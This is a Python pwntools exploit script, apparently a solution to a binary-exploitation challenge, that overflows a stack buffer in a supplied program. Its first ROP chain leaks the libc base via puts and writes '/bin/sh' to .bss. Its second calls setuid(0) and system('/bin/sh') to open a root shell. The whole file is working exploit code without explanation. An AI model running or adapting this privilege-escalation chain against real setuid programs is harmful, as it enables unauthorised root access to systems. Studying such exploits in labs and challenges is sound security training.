#!/usr/bin/env python3
from pwn import *
from sys import argv

log_addr = lambda name, addr: log.info('Leaked %s address: %#lx'%(name,addr))

try:
  binary = ELF(argv[1], checksec=False)
  libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
  p = binary.process(env={})

  pop_rax = 0x0000000000401ce0
  pop_rdi = 0x0000000000401ce8
  pop_rsi = 0x0000000000401cd8
  pop_rdx = 0x0000000000401cf0
  syscall = 0x0000000000401d08

  # leak libc ret2plt
  offset=104
  bss_write = 0x00404068
  payload = b''.join([
    b'A'*offset,
    p64(pop_rdi) + p64(binary.got['puts']),
    p64(binary.symbols['puts']),

    p64(pop_rdi) + p64(0),
    p64(pop_rsi) + p64(bss_write),
    p64(pop_rdx) + p64(8),
    p64(binary.symbols['read']),

    p64(binary.symbols['challenge']),
  ])

  p.sendline(payload)
  p.send(b'/bin/sh\0')
  libc_base = int.from_bytes(p.recv().split(b'\n')[-2], 'little')-libc.symbols['puts']
  log_addr("Libc", libc_base)

  # setuid(0);
  # system('/bin/sh');
  payload = b''.join([
    b'A'*offset,
    p64(pop_rdi) + p64(0),
    p64(libc_base+libc.symbols['setuid']),
    p64(0x000000000040101a),
    p64(pop_rdi)+p64(bss_write),
    p64(libc_base+libc.symbols['system']),
  ])
  pause()
  p.sendline(payload)
  p.interactive()


except IndexError:
  print("Usage: %s <path>" % argv[0])

